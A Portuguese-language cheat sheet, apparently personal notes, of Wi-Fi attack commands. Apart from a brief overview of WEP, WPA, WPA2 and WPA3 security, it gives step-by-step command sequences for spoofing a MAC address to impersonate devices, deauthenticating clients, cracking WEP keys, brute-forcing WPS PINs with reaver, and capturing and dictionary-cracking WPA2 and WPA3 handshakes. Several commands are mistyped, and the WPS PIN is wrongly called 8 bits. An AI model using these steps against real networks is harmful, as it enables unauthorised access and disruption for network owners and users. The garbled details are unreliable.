## Trocar o endereço MAC

**Objetivos:**
- Anonimizar
- Passar por outro dispositvo

**Comandos:**

   `$ ifconfig`<br>
   `$ ifconfig {interface} down`<br>
   `$ ifconfig {interface} hw ether {MAC novo}`<br>
   `$ ifconfig {interface} up`

# Wlan

Os principais tipos de segurança Wi-Fi: 

1️⃣ WEP (Wired Equivalent Privacy)

    Ano: 1997 (primeiro padrão de segurança Wi-Fi)

    Criptografia: RC4

    Chaves: 64 ou 128 bits

    Situação atual: Obsoleto e inseguro — quebra-se facilmente com ataques de força bruta ou dicionário.

    Uso: Não recomendado, mas ainda encontrado em roteadores muito antigos.

2️⃣ WPA (Wi-Fi Protected Access)

    Ano: 2003

    Criptografia: TKIP (Temporal Key Integrity Protocol)

    Melhoria sobre o WEP: Chaves dinâmicas e autenticação melhorada.

    Situação atual: Mais seguro que WEP, mas TKIP também está obsoleto e vulnerável.

    Uso: Praticamente substituído pelo WPA2.

3️⃣ WPA2

    Ano: 2004

    Criptografia: AES-CCMP (padrão atual de segurança)

    Versões:

        WPA2-Personal (PSK): Usa senha compartilhada.

        WPA2-Enterprise: Usa servidor RADIUS para autenticação.

    Situação atual: Ainda amplamente usado, mas vulnerável a ataques de dicionário se a senha for fraca.

    Observação: TKIP pode ser usado em WPA2 por compatibilidade, mas isso reduz a segurança.

4️⃣ WPA3

    Ano: 2018

    Criptografia: SAE (Simultaneous Authentication of Equals)

    Melhoria: Mais resistente a ataques de força bruta offline, segurança melhor mesmo com senhas fracas.

    Versões:

        WPA3-Personal

        WPA3-Enterprise

    Situação atual: Mais seguro, mas nem todos os dispositivos suportam.

5️⃣ WPA/WPA2/WPA3 Mixed Mode

    Permite que dispositivos antigos (que só suportam WPA ou WPA2) coexistam com dispositivos mais novos em WPA3.

    Risco: O nível de segurança é reduzido ao mais fraco disponível.

## Colocando a interface no modo de monitoramento

### Opção 1
   `$ iwconfig`<br>
   `$ ifconfig {interface} down`<br>
   `$ airmon-ng check kill* (opcional)`<br>
   `$ iwconfig {interface} mode monitor`<br>
   `$ ifconfig {interface} up`
### Opção 2
   `$ iwconfig`<br>
   `$ airmon-ng check kill` <br>
   `$ aimon-nf start {interface}`
- Neste caso é criada uma nova inteface - normalmente com o acrescimo de 'mon' ao final do nome da inteface original.
## Restaurando a interface para o modo managed

### Opção 1 (se feito pelo opção 1 anterior)
   `$ iwconfig`<br>
   `$ ifconfig {interface} down`<br>
   `$ airmon-ng check kill* (opcional)`<br>
   `$ iwconfig {interface} mode managed`<br>
   `$ ifconfig {interface} up`
### Opção 2 (se feito pelo opção 2 anterior)
   `$ iwconfig`<br>
   `$ airmon-ng check kill` <br>
   `$ aimon-nf stop {interface mon} `<br>
   `$ service NetworkManager restart, ou systemch restart NetworkManager`
### Opção 3 (ambos os casos)
   `$ rebbot`

## Monitorar redes de wifi
### Descobrindo as redes Wi-Fi

Com o modo monitor habilitado:

   `$ airodump-ng {interface}* - para redes 2.4Ghz`<br>
   `$ airodump-ng --band a {interface}` - para redes 5Ghz <br>
   `$ airodump-ng --band a {interface}` - para ambas

### Monitorando uma rede específica (e gravar em arquivo)
   `$ airodump-ng --bssid {MAC alvo} --channel {canal alvo} --write {arquivo} {interface}`

### Desconectando um aparelho
Rodar simultaneamente , em outro terminal, com o airodump-ng 

   `$ aireplay-ng --deauth {número de envios} -a {MAC Access Point} -c {MAC Cliente} {interface}`

## Hackeando - segurança WEP
No terminal:

   `$ airodump-ng --bssid {MAC alvo} --channel {canal alvo} --write {arquivo} {interface}`
   
Em outro terminal:

   `S aircrack-ng {arquivo.cap}` - Para achar a chave

- Para se conectar, basta selecionar a rede alvo e digitar a chave sem os ":"

### Redes de baixa utilização
Necessidade provocar o envio de packets pelo Access point

No terminal 1:

   `S ifconfig` - para obter o MAC da interface: 6 primeiros números do unspec. <br>
   `$ airodump-ng --bssid {MAC alvo} --channel {canal alvo} --write {arquivo} {interface}`

No terminal 2:

   `$ aireplay-ng --fakeauth 0 -a {MAC Access Point} -h {MAC interface} {interface}` - Obter conexão com o AC, mas ainda não autenticado.<br>
    `$ aireplay-ng --arpreplay -b {MAC Access Point} -h {MAC interface} {interface}` - Força envio de pacotes pelo Access Point

No terminal 3:

   `$ aireplay-ng --fakeauth 0 -a {MAC Access Point} -h {MAC interface} {interface}` <br>
   `$ aircrack-ng {arquivo.cap}`

## Hackeando - segurança WPA/WPA2

### Com WPS habilitado (easy way)

Vunerabilidade quando a conexão para impressora está habilitada, e sem o botão de 'conexão'.
- Uso de um pin de apenas 8 bits

No terminal:

`$ wash --interface {interface}`<br>
`$ aireplay-ng --fakeauth 30 -a {MAC alvo} -h {MAC interface} {interface}`

Em outro terminal:

`$ reaver --bssid {MAC alvo} --channel {canal alvo} --interface {interface} -vvv --no-associate`

### Sem WPS habilitado 
- Capturando o 'handshake'

**Passo 1:**

`$ airodump-ng --bssid {MAC alvo} --channel {canal alvo} --write {arquivo} {interface}`
Esperar por um cliente se conectar

Em outro terminal:

 `$ aireplay-ng --deauth {número de envios = 4} -a {MAC Access Point} -c {MAC Cliente} {interface}`

**Passo 2:**

Criar um wordlist <br>
`$ crunch {tamanho min} {tamanho max} {lista de caracteres} -t {padrão} - {arquivo}`<br>
Ou obter uma lista pronta

**Passo 3:**

`$ aircrack-ng {arquivo.cap} -w {wordlist}`

## Hackeando - segurança WPA3

Protocolo principal: SAE (Simultaneous Authentication of Equals, também chamado de Dragonfly handshake).<br>
Diferença do WPA2: É muito mais resistente a ataques de captura de handshake e dicionário offline. <br>
Principais modos:
- WPA3-Personal: SAE + AES-CCMP
- WPA3-Enterprise: Autenticação 802.1X com criptografia avançada
- Modo de transição: Aceita WPA2 e WPA3, mas é o ponto fraco mais comum.

1. Identificar a rede e o modo

```
airmon-ng start {interface}
airodump-ng {interface de monitoramento}
```
→ Veja se a rede está só em WPA3 ou em modo transição.

2. Capturar o handshake SAE

`hcxdumptool -i {interface de monitoramento} -o {arquivo de captura} --enable_status=15` <br>
→ Isso captura as tentativas de autenticação SAE.

3. Converter para formato de ataque controlado
`hcxpcapngtool -o {arquivo} {arquivo de captura}`

4. Testar a força da senha

`hashcat -m 22000 {arquivo} {wordlist}`<br>
→ Se a senha for fraca, o hashcat vai achar.
